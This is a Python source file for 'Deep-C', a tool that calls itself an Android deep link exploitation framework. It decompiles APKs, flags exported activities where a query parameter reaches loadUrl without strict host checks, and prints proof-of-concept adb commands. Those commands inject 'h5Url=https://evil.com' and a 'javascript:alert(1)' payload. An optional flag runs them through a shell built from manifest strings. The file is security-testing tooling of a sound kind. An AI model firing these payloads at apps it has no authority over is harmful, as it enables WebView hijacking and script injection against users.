import xml.etree.ElementTree as ET
import subprocess
import argparse
import os
import shutil
import sys
import json
import re

ANDROID_NS = "{http://schemas.android.com/apk/res/android}"

OUT_DIR = os.path.abspath("deepc_out")
APKTOOL_DIR = os.path.join(OUT_DIR, "apktool")

JADX_OUT_DIR = os.path.abspath("deepc_jadx_out")
SRC_DIR = os.path.join(JADX_OUT_DIR, "sources")

# ---------------- Validation Patterns ---------------- #

STRONG_HOST_PATTERNS = [
    r'getHost\(\)\.equals\("',
    r'equalsIgnoreCase\("',
]

WEAK_HOST_PATTERNS = [
    r'endsWith\("',
    r'contains\("',
    r'startsWith\("https://',
    r'startsWith\("http://',
]

# ---------------- Banner ---------------- #

def banner():
    print(r"""
██████╗ ███████╗███████╗██████╗       ██████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗     ██╔════╝
██║  ██║█████╗  █████╗  ██████╔╝     ██║     
██║  ██║██╔══╝  ██╔══╝  ██╔═══╝      ██║     
██████╔╝███████╗███████╗██║          ╚██████╗
╚═════╝ ╚══════╝╚══════╝╚═╝           ╚═════╝

 Deep-C | Android Deep Link Exploitation Framework By Kishor Balan
 Decompile • Detect • Validate • Exploit
""")

# ---------------- Helpers ---------------- #

def run(cmd, msg):
    print(f"[*] {msg}")
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def clean_dirs():
    if os.path.exists(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR, exist_ok=True)

# ---------------- Decompilation ---------------- #

def decompile_manifest(apk):
    run(
        ["apktool", "d", apk, "-o", APKTOOL_DIR, "-f"],
        "Decompiling APK (manifest & resources)"
    )
    manifest = os.path.join(APKTOOL_DIR, "AndroidManifest.xml")
    if not os.path.exists(manifest):
        sys.exit("[-] AndroidManifest.xml not found")
    return manifest

def decompile_source_with_jadx(apk):
    if os.path.exists(JADX_OUT_DIR):
        shutil.rmtree(JADX_OUT_DIR)

    os.makedirs(JADX_OUT_DIR, exist_ok=True)

    print("[*] Decompiling APK to Java/Kotlin source (jadx)")
    result = subprocess.run(
        ["jadx", "-d", JADX_OUT_DIR, apk],
        #stdout=subprocess.PIPE,
        #stderr=subprocess.PIPE,
        #text=True
    )

    if result.stdout:
        print("[jadx stdout]")
        print(result.stdout)

    if result.stderr:
        print("[jadx stderr]")
        print(result.stderr)

   # if result.returncode != 0:
      #  sys.exit("[-] Jadx failed during decompilation")

def verify_jadx_output():
    if not os.path.isdir(SRC_DIR):
        sys.exit("[-] Jadx output directory not found")

    for root, _, files in os.walk(SRC_DIR):
        for f in files:
            if f.endswith((".java", ".kt")):
                return

    sys.exit("[-] Jadx ran but produced no Java/Kotlin files")

# ---------------- Manifest Parsing ---------------- #

def parse_manifest(path):
    root = ET.parse(path).getroot()
    return root, root.attrib.get("package")

def is_exported(component):
    exported = component.attrib.get(ANDROID_NS + "exported")
    if exported is None:
        return component.find("intent-filter") is not None
    return exported.lower() == "true"

def extract_deeplinks(activity):
    deeplinks = []
    for intent in activity.findall("intent-filter"):
        actions = [a.attrib.get(ANDROID_NS + "name") for a in intent.findall("action")]
        cats = [c.attrib.get(ANDROID_NS + "name") for c in intent.findall("category")]

        if "android.intent.action.VIEW" not in actions:
            continue
        if "android.intent.category.BROWSABLE" not in cats:
            continue

        for data in intent.findall("data"):
            deeplinks.append({
                "scheme": data.attrib.get(ANDROID_NS + "scheme"),
                "host": data.attrib.get(ANDROID_NS + "host"),
                "path": (
                    data.attrib.get(ANDROID_NS + "path")
                    or data.attrib.get(ANDROID_NS + "pathPrefix")
                    or data.attrib.get(ANDROID_NS + "pathPattern")
                )
            })
    return deeplinks

# ---------------- Source Code Analysis ---------------- #

def find_activity_source(activity):
    base = activity.split(".")[-1]
    print(f"[*] Analyzing source for activity: {activity}")

    for root, _, files in os.walk(SRC_DIR):
        for ext in (".java", ".kt"):
            name = base + ext
            if name in files:
                path = os.path.join(root, name)
                print(f"    [+] Found source file: {path}")
                return path

    print(f"    [!] Source file not found for {activity}")
    return None

def extract_paths_from_code(code):
    paths = set()
    patterns = [
        r'getPath\(\)\.equals\("([^"]+)"\)',
        r'StringsKt\.equals\$default\(\s*uri\.getPath\(\)\s*,\s*"([^"]+)"',
        r'uri\.getPath\(\)\s*==\s*"([^"]+)"'
    ]

    for p in patterns:
        for match in re.findall(p, code):
            if match.startswith("/"):
                paths.add(match)

    return list(paths)

def extract_query_params(code):
    return re.findall(r'getQueryParameter\(\s*"([^"]+)"\s*\)', code)

def analyze_source(path):
    if not path or not os.path.exists(path):
        return None

    with open(path, "r", errors="ignore") as f:
        code = f.read()

    query_params = extract_query_params(code)

    direct_flow = (
        "loadUrl(" in code and
        "getQueryParameter(" in code
    )

    override_flow = (
        re.search(r'\w+\s*=\s*.*getQueryParameter\(', code) and
        re.search(r'loadUrl\(\s*\w+\s*\)', code)
    )

    exploitable_flow = direct_flow or override_flow

    if not exploitable_flow:
        print("    [-] No exploitable sink flow found")
        return None

    strong_validation = any(re.search(p, code) for p in STRONG_HOST_PATTERNS)
    weak_validation = any(re.search(p, code) for p in WEAK_HOST_PATTERNS)

    if not strong_validation and not weak_validation:
        level = "VULNERABLE"
    elif weak_validation and not strong_validation:
        level = "WEAK_VALIDATION"
    else:
        level = "SAFE"

    print(f"    [+] Issue classified as: {level}")

    return {
        "level": level,
        "paths": extract_paths_from_code(code),
        "query_params": query_params,
        "weak_validation": weak_validation,
        "strong_validation": strong_validation,
        "code": code[:4000]
    }

# ---------------- PoC Generation ---------------- #

def generate_pocs(pkg, activity, deeplink):
    scheme = deeplink.get("scheme") or "https"
    host = deeplink.get("host") or ""
    path = deeplink.get("path") or "/"

    base = f"{scheme}://{host}" if host else f"{scheme}://"

    return [
        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?h5Url=https://evil.com"',
        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?h5Url=javascript:alert(1)"',
        f'adb shell am start -n {pkg}/{activity}'
    ]

# ---------------- Main ---------------- #

def main():
    banner()

    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--apk", required=True)
    parser.add_argument("--exec", action="store_true")
    args = parser.parse_args()

    apk_path = os.path.abspath(args.apk)
    if not os.path.isfile(apk_path):
        sys.exit(f"[-] APK not found: {apk_path}")

    clean_dirs()
    manifest = decompile_manifest(apk_path)
    decompile_source_with_jadx(apk_path)
    verify_jadx_output()

    root, package = parse_manifest(manifest)
    print(f"[+] Package: {package}\n")

    results = {"package": package, "findings": []}

    for app in root.findall("application"):
        for act in app.findall("activity"):
            name = act.attrib.get(ANDROID_NS + "name")
            if not name or not is_exported(act):
                continue

            deeplinks = extract_deeplinks(act)
            if not deeplinks:
                continue

            src = find_activity_source(name)
            analysis = analyze_source(src)
            if not analysis or analysis["level"] == "SAFE":
                continue

            paths = (
                analysis.get("paths")
                or [dl.get("path") for dl in deeplinks if dl.get("path")]
                or ["/"]
            )

            print("[+] Deep Link Issue Found")
            print(f"    Activity     : {name}")
            print(f"    Level        : {analysis['level']}")
            if analysis.get("query_params"):
                print(f"    Query Params : {', '.join(analysis['query_params'])}")
            print(f"    Source       : {src}")

            for path in paths:
                dl = deeplinks[0]
                dl_effective = {
                    "scheme": dl.get("scheme"),
                    "host": dl.get("host"),
                    "path": path
                }

                print(f"    Entry Path : {path}")
                print("    PoCs:")

                pocs = generate_pocs(package, name, dl_effective)
                for p in pocs:
                    print(f"      {p}")
                    if args.exec:
                        subprocess.run(p, shell=True)

                results["findings"].append({
                    "activity": name,
                    "source": src,
                    "path": path,
                    "level": analysis["level"],
                    "query_params": analysis["query_params"],
                    "weak_validation": analysis["weak_validation"],
                    "strong_validation": analysis["strong_validation"],
                    "pocs": pocs
                })

            print("-" * 70)

    with open("deepc_result.json", "w") as f:
        json.dump(results, f, indent=4)

    print("\n[+] Results saved to deepc_result.json")

if __name__ == "__main__":
    main()
